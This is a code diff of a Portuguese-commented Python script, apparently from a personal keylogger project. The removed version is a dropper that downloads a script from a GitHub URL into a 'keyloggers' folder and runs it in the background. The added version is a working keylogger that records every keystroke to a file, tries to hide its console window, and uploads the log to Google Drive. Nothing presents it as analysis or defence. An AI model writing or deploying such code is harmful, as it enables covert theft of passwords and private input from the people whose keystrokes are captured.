@@ -1,26 +1,50 @@
 import os
-import requests
-import subprocess
+import logging
+from pynput.keyboard import Key, Listener
+from pydrive.auth import GoogleAuth
+from pydrive.drive import GoogleDrive
 
-def download_file(url, destination):
-    """Baixa um arquivo da URL fornecida e salva no destino especificado."""
-    response = requests.get(url)
-    with open(destination, 'wb') as file:
-        file.write(response.content)
+# Função para enviar arquivo ao Google Drive
+def upload_to_drive(filename):
+    gauth = GoogleAuth()
+    gauth.LoadCredentialsFile("credentials.txt")  # Tenta carregar as credenciais existentes
 
-def execute_file_in_background(filepath):
-    """Executa o arquivo em segundo plano no sistema."""
-    subprocess.Popen(filepath, shell=True)
+    if gauth.credentials is None:
+        gauth.LocalWebserverAuth()  # Autentica se não houver credenciais
+    elif gauth.access_token_expired:
+        gauth.Refresh()  # Atualiza o token se estiver expirado
+    else:
+        gauth.Authorize()
 
-# URL do arquivo que você deseja baixar
-url = "https://raw.githubusercontent.com/Amilt0n/teste/master/system.py"
+    gauth.SaveCredentialsFile("credentials.txt")  # Salva as credenciais para a próxima execução
 
-# Diretório e nome do arquivo onde você deseja salvar
-destination = "D:\\keyloggers\\teste\\x64cls.py"
+    drive = GoogleDrive(gauth)
 
-# Baixe o arquivo
-download_file(url, destination)
-print(f"Arquivo baixado para: {destination}")
+    # Criando um arquivo no Google Drive
+    file_drive = drive.CreateFile({'title': filename})
+    file_drive.SetContentFile(filename)
+    file_drive.Upload()
+    print("Arquivo carregado com sucesso!")
 
-# Execute o arquivo em segundo plano
-execute_file_in_background(destination)
+# Função para registrar teclas pressionadas
+def on_press(key):
+    try:
+        logging.info(str(key.char))
+    except AttributeError:
+        logging.info(str(key))
+
+# Esconde o prompt (assumindo que está sendo executado no Windows)
+os.system('mode con: cols=15 lines=1')
+os.system('color 0F')
+os.system("start /min")
+
+# Configura o log para salvar as teclas pressionadas em "teclas_log.txt"
+logging.basicConfig(filename=("teclas_log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+# Inicia o keylogger
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+# Quando o keylogger for encerrado (por exemplo, se você encerrar manualmente o programa),
+# ele enviará o arquivo "teclas_log.txt" para o Google Drive.
+upload_to_drive("teclas_log.txt")
